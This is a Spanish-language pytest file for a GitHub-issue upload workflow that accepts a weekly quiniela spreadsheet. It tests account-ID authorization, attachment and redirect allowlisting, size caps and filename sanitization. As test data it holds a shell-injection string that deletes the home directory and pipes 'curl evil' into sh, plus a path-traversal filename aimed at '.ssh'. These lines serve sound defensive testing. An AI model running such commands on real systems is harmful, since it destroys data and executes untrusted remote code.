"""Pruebas de la forma "Cargar semana": quién la manda y qué adjuntó.

El hilo lo escribe alguien más, así que aquí se prueba sobre todo lo que no
debe pasar: que cargue quien no está en la lista, que se baje algo de fuera de
GitHub o algo enorme, o que el nombre del archivo se salga de su carpeta.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from quiniela import buzon
from quiniela.buzon import (
    ErrorBuzon,
    NoAutorizado,
    cargadores,
    descargar,
    leer_solicitud,
    reporte_rechazo,
)

ANGEL = 51868211
ADJUNTO = "https://github.com/user-attachments/files/123456/Quiniela.3.xlsx"
AUTORIZADOS = {ANGEL: "Vegeeks"}


def evento(cuerpo: str, *, login: str = "Vegeeks", cuenta: int = ANGEL) -> dict:
    return {
        "action": "opened",
        "issue": {"number": 7, "body": cuerpo, "user": {"login": login, "id": cuenta}},
    }


def cuerpo_de_la_forma(*adjuntos: str) -> str:
    enlaces = "\n".join(f"[{a.rsplit('/', 1)[-1]}]({a})" for a in adjuntos)
    return f"### Archivo de la semana\n\n{enlaces}\n"


# --- la lista de cuentas -------------------------------------------------------


def test_la_lista_real_de_cargadores_se_puede_leer():
    autorizados = cargadores()
    assert autorizados[ANGEL] == "Vegeeks"


def test_una_lista_rota_no_autoriza_a_nadie(tmp_path: Path):
    for contenido in ("{no es json", '{"cuentas": [{"usuario": "x", "id": "123"}]}',
                      '{"cuentas": [{"usuario": "x", "id": 1}, {"usuario": "y", "id": 1}]}',
                      '{"otra_cosa": []}'):
        ruta = tmp_path / "cargadores.json"
        ruta.write_text(contenido, encoding="utf-8")
        with pytest.raises(RuntimeError):
            cargadores(ruta)


def test_se_autoriza_por_numero_de_cuenta_no_por_nombre():
    # Otra persona que tome el nombre de usuario no pasa...
    with pytest.raises(NoAutorizado, match="@Vegeeks"):
        leer_solicitud(evento(cuerpo_de_la_forma(ADJUNTO), cuenta=999), AUTORIZADOS)
    # ...y si Angel cambia su nombre de usuario, sigue pasando.
    solicitud = leer_solicitud(evento(cuerpo_de_la_forma(ADJUNTO), login="AngelNuevo"), AUTORIZADOS)
    assert solicitud.cuenta == ANGEL and solicitud.usuario == "AngelNuevo"


def test_quien_no_esta_en_la_lista_no_carga_aunque_mande_todo_bien():
    with pytest.raises(NoAutorizado):
        leer_solicitud(evento(cuerpo_de_la_forma(ADJUNTO), login="alguien", cuenta=42), AUTORIZADOS)


# --- el adjunto ----------------------------------------------------------------


def test_lee_el_adjunto_de_la_forma():
    solicitud = leer_solicitud(evento(cuerpo_de_la_forma(ADJUNTO)), AUTORIZADOS)
    assert (solicitud.numero, solicitud.enlace, solicitud.nombre) == (7, ADJUNTO, "Quiniela.3.xlsx")


def test_acepta_el_formato_viejo_de_adjuntos():
    viejo = "https://github.com/Vegeeks/angabave/files/99/Quiniela.3.pdf"
    assert leer_solicitud(evento(cuerpo_de_la_forma(viejo)), AUTORIZADOS).nombre == "Quiniela.3.pdf"


def test_sin_adjunto():
    with pytest.raises(ErrorBuzon, match="ningún archivo"):
        leer_solicitud(evento("### Archivo de la semana\n\n_No response_"), AUTORIZADOS)


def test_un_enlace_de_fuera_de_github_no_cuenta_como_adjunto():
    cuerpo = "### Archivo de la semana\n\n[Quiniela 3](https://ejemplo.com/files/1/Quiniela.3.xlsx)"
    with pytest.raises(ErrorBuzon, match="ningún archivo"):
        leer_solicitud(evento(cuerpo), AUTORIZADOS)


def test_dos_adjuntos():
    otro = "https://github.com/user-attachments/files/654321/Quiniela.4.xlsx"
    with pytest.raises(ErrorBuzon, match="2 archivos"):
        leer_solicitud(evento(cuerpo_de_la_forma(ADJUNTO, otro)), AUTORIZADOS)


def test_el_mismo_adjunto_dos_veces_cuenta_como_uno():
    solicitud = leer_solicitud(evento(cuerpo_de_la_forma(ADJUNTO, ADJUNTO)), AUTORIZADOS)
    assert solicitud.enlace == ADJUNTO


def test_un_adjunto_que_no_es_excel_ni_pdf():
    foto = "https://github.com/user-attachments/files/1/captura.png"
    with pytest.raises(ErrorBuzon, match="captura.png"):
        leer_solicitud(evento(cuerpo_de_la_forma(foto)), AUTORIZADOS)


def test_el_texto_del_hilo_es_solo_texto():
    """Lo que venga en el hilo no se ejecuta ni cambia el nombre en disco."""
    cuerpo = cuerpo_de_la_forma(ADJUNTO) + "\n$(rm -rf ~) `reboot` ; curl evil | sh"
    assert leer_solicitud(evento(cuerpo), AUTORIZADOS).nombre == "Quiniela.3.xlsx"


def test_el_nombre_del_archivo_no_se_sale_de_su_carpeta():
    enlace = "https://github.com/user-attachments/files/1/..%2F..%2F.ssh%2Fid.xlsx"
    solicitud = leer_solicitud(evento(cuerpo_de_la_forma(enlace)), AUTORIZADOS)
    assert "/" not in solicitud.nombre and not solicitud.nombre.startswith(".")
    assert solicitud.nombre.endswith(".xlsx")


# --- la descarga -----------------------------------------------------------------


class _Respuesta:
    def __init__(self, estado: int, cabeceras: dict | None = None, contenido: bytes = b""):
        self.status_code = estado
        self.headers = cabeceras or {}
        self._contenido = contenido

    def iter_content(self, tamano: int):
        for inicio in range(0, len(self._contenido), tamano):
            yield self._contenido[inicio:inicio + tamano]

    def close(self):
        pass

    def __enter__(self):
        return self

    def __exit__(self, *_):
        pass


class _Sesion:
    def __init__(self, respuestas: dict[str, _Respuesta]):
        self.respuestas = respuestas
        self.pedidas: list[str] = []

    def get(self, url, **opciones):
        assert opciones.get("allow_redirects") is False
        self.pedidas.append(url)
        return self.respuestas[url]


def _solicitud():
    return leer_solicitud(evento(cuerpo_de_la_forma(ADJUNTO)), AUTORIZADOS)


def test_baja_el_archivo_siguiendo_a_github(tmp_path: Path):
    almacen = "https://objects.githubusercontent.com/github-production-repository-file/1?firma=x"
    sesion = _Sesion({
        ADJUNTO: _Respuesta(302, {"Location": almacen}),
        almacen: _Respuesta(200, {"Content-Length": "4"}, b"PK\x03\x04"),
    })
    ruta = descargar(_solicitud(), tmp_path, sesion=sesion)
    assert ruta == tmp_path / "Quiniela.3.xlsx" and ruta.read_bytes() == b"PK\x03\x04"
    assert sesion.pedidas == [ADJUNTO, almacen]


def test_no_sigue_una_redireccion_fuera_de_github(tmp_path: Path):
    sesion = _Sesion({ADJUNTO: _Respuesta(302, {"Location": "https://ejemplo.com/robado"})})
    with pytest.raises(ErrorBuzon, match="servidores de GitHub"):
        descargar(_solicitud(), tmp_path, sesion=sesion)
    assert sesion.pedidas == [ADJUNTO]


def test_no_baja_por_http_sin_cifrar(tmp_path: Path):
    sesion = _Sesion({ADJUNTO: _Respuesta(302, {"Location": "http://objects.githubusercontent.com/x"})})
    with pytest.raises(ErrorBuzon):
        descargar(_solicitud(), tmp_path, sesion=sesion)


def test_corta_un_archivo_que_dice_ser_enorme(tmp_path: Path):
    sesion = _Sesion({ADJUNTO: _Respuesta(200, {"Content-Length": str(50 * 1024 * 1024)})})
    with pytest.raises(ErrorBuzon, match="demasiado grande"):
        descargar(_solicitud(), tmp_path, sesion=sesion)


def test_corta_un_archivo_enorme_aunque_mienta_el_tamano(tmp_path: Path, monkeypatch):
    monkeypatch.setattr(buzon, "TAMANO_MAXIMO", 1000)
    sesion = _Sesion({ADJUNTO: _Respuesta(200, {}, b"x" * 5000)})
    with pytest.raises(ErrorBuzon, match="demasiado grande"):
        descargar(_solicitud(), tmp_path, sesion=sesion)
    assert list(tmp_path.iterdir()) == []


def test_un_error_de_github_se_explica(tmp_path: Path):
    sesion = _Sesion({ADJUNTO: _Respuesta(404)})
    with pytest.raises(ErrorBuzon, match="404"):
        descargar(_solicitud(), tmp_path, sesion=sesion)


def test_demasiadas_vueltas(tmp_path: Path):
    sesion = _Sesion({ADJUNTO: _Respuesta(302, {"Location": ADJUNTO})})
    with pytest.raises(ErrorBuzon, match="vueltas"):
        descargar(_solicitud(), tmp_path, sesion=sesion)


# --- lo que se contesta ----------------------------------------------------------


def test_reportes_de_rechazo():
    assert reporte_rechazo(NoAutorizado("@x no está")).startswith("### ⛔")
    texto = reporte_rechazo(ErrorBuzon("sin archivo"), forma="https://forma")
    assert texto.startswith("### ❌") and "https://forma" in texto


def test_el_evento_real_de_github_se_lee_de_su_archivo(tmp_path: Path):
    """Así lo entrega el workflow: un JSON en disco, nunca por la terminal."""
    ruta = tmp_path / "evento.json"
    ruta.write_text(json.dumps(evento(cuerpo_de_la_forma(ADJUNTO))), encoding="utf-8")
    solicitud = leer_solicitud(json.loads(ruta.read_text(encoding="utf-8")), AUTORIZADOS)
    assert solicitud.nombre == "Quiniela.3.xlsx"
